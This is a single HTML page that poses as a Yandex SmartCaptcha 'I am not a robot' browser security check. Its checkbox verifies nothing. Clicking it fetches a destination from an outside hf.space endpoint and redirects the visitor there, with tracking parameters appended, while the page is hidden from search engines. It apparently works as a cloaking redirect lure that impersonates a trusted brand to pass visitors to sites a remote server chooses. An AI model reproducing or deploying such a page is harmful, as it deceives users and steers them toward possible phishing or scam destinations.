<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Проверка безопасности браузера</title>
    
        <style>
        :root {
            --sc-blue: #4d81f1;
            --sc-gray-border: #e5e7eb;
            --sc-gray-hover: #d1d5db;
            --card-bg: #ffffff;
            --text-head: #000000;
            --text-body: #6b7280;
            --text-footer: #9ca3af;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: url('bg.jpg') center/cover no-repeat fixed;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(to bottom, rgba(250, 208, 228, 0.6) 0%, rgba(135, 186, 245, 0.9) 100%);
            z-index: 0;
        }

        .sc-widget {
            z-index: 1;
            background: var(--card-bg);
            width: 100%;
            max-width: 360px;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            padding: 20px;
            cursor: pointer;
            transition: box-shadow 0.2s ease, transform 0.2s ease;
            user-select: none;
            display: flex;
            flex-direction: column;
        }
        
        .sc-widget:hover {
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
            transform: translateY(-2px);
        }

        .sc-content {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }

        .sc-checkbox {
            width: 32px;
            height: 32px;
            background-color: #fff;
            border: 2px solid var(--sc-gray-border);
            border-radius: 6px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-right: 16px;
            flex-shrink: 0;
            transition: all 0.2s ease;
        }
        
        .sc-widget:hover .sc-checkbox {
            border-color: var(--sc-blue);
        }

        .sc-checkmark {
            display: none;
            width: 18px;
            height: 18px;
        }

        .sc-checkmark path {
            stroke: white;
            stroke-width: 3;
            stroke-linecap: round;
            stroke-linejoin: round;
            fill: none;
        }

        .sc-texts {
            display: flex;
            flex-direction: column;
        }

        .sc-title {
            font-size: 17px;
            font-weight: 600;
            color: var(--text-head);
            margin-bottom: 4px;
        }

        .sc-subtitle {
            font-size: 13px;
            color: var(--text-body);
        }

        .sc-footer {
            font-size: 12px;
            color: var(--text-footer);
            text-align: left;
        }

        /* Loader */
        .loader-ui {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid transparent;
            border-radius: 50%;
            border-top-color: var(--sc-blue);
            border-right-color: var(--sc-blue);
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* States */
        .sc-widget.active {
            pointer-events: none;
        }
        .sc-widget.active .sc-checkbox {
            border-color: var(--sc-blue);
        }
        .sc-widget.active .loader-ui {
            display: block;
        }
        
        .sc-widget.success .sc-checkbox {
            background-color: var(--sc-blue);
            border-color: var(--sc-blue);
        }
        .sc-widget.success .sc-checkmark {
            display: block;
        }
        .sc-widget.success .loader-ui {
            display: none;
        }
        
        .sc-widget.error .sc-checkbox {
            background-color: #ef4444;
            border-color: #ef4444;
        }
        .sc-widget.error .sc-title {
            color: #ef4444;
        }
    </style>
</head>
<body>

    <div class="sc-widget" id="submitAction">
        <div class="sc-content">
            <div class="sc-checkbox" id="scCheckbox">
                <svg class="sc-checkmark" viewBox="0 0 24 24">
                    <path d="M5 12l5 5L20 7"></path>
                </svg>
                <div class="loader-ui" id="scLoader"></div>
            </div>
            <div class="sc-texts">
                <div class="sc-title">Я не робот</div>
                <div class="sc-subtitle">Нажмите, чтобы продолжить</div>
            </div>
        </div>
        <div class="sc-footer">
            SmartCaptcha by Yandex Cloud
        </div>
    </div>

    <div id="errorMsg" style="display: none; color: #ef4444; margin-top: 15px; font-size: 14px; text-align: center; width: 100%; position: relative; z-index: 2;"></div>
    <div id="debugLog" style="display: none; color: #999; margin-top: 10px; font-size: 11px; text-align: left; word-break: break-all; position: relative; z-index: 2;"></div>

    <script>

        const MY_PROXY_API = "https://fdfsd2-inmj6ddj9n.hf.space/api.php";

        function appendUtmSource(targetUrl) {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const utmSource = urlParams.get('utm_source');
                if (utmSource) {
                    const urlObj = new URL(targetUrl);
                    urlObj.searchParams.set('utm_source', utmSource);
                    return urlObj.toString();
                }
            } catch (e) {
                console.error('Error appending utm_source', e);
            }
            return targetUrl;
        }

        document.addEventListener('DOMContentLoaded', function() {
            const btn = document.getElementById('submitAction');
            const errMsg = document.getElementById('errorMsg');
            const debugLog = document.getElementById('debugLog');

            btn.addEventListener('click', async function(evt) {
                evt.preventDefault();
                if (btn.classList.contains('active') || btn.classList.contains('success')) return;
                
                btn.classList.add('active');
                btn.classList.remove('error');
                if (errMsg) errMsg.style.display = 'none';
                if (debugLog) debugLog.style.display = 'none';

                try {
                    const response = await fetch(MY_PROXY_API);
                    const data = await response.json();
                    
                    if (data && data.success && data.url) {
                        btn.classList.remove('active');
                        btn.classList.add('success');
                        setTimeout(() => {
                            btn.classList.remove('active'); btn.classList.add('success'); window.location.href = appendUtmSource(data.url);
                        }, 600);
                    } else {
                        throw new Error(data.error || 'Unknown Error (Status ' + response.status + ')');
                    }
                } catch (error) {
                    console.error("Fetch Error:", error);
                    setTimeout(() => {
                        btn.classList.remove('active');
                        btn.classList.add('error');
                        btn.querySelector('.sc-title').innerText = 'Ошибка. Попробовать еще раз';
                        
                        if (errMsg) {
                            errMsg.style.display = 'block';
                            errMsg.textContent = "Ошибка: " + error.message;
                        }
                        if (debugLog) {
                            debugLog.style.display = 'block';
                            debugLog.textContent = "DEBUG: " + error.message;
                        }
                    }, 500);
                }
            });
        });
    </script>
</body>
</html>
